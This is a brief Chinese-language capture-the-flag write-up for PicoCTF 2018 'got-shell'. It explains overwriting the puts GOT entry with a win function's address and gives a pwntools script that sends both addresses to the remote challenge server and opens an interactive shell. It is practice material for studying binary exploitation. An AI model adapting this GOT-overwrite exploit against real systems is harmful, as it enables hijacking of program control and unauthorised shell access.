改写got表中内容，还算是第一次见吧

IDA找到`got['puts]`表项的地址为`0x804a00c`（不是got表中的内容）。所以我们只需要把`0x804a00c`地址处的值改为`win`函数的地址就行，这样在之后执行`puts`函数的时候就相当于执行`win`了。


```python
from pwn import *

context.os = 'linux'
context.arch = 'i386'
context.log_level = 'debug'

io = remote('node4.buuoj.cn', 25477)

e = ELF('./PicoCTF_2018_got-shell')
binsh_str = 0x80486f0
win_addr = 0x804854b

e_got_puts_addr = 0x804a00c
payload1 = hex(e_got_puts_addr).encode()
io.sendlineafter(b'4 byte value?\n', payload1[2:])

payload2 = hex(win_addr).encode()
io.sendlineafter(payload1[2:]+b'\n', payload2[2:])
io.interactive()
```
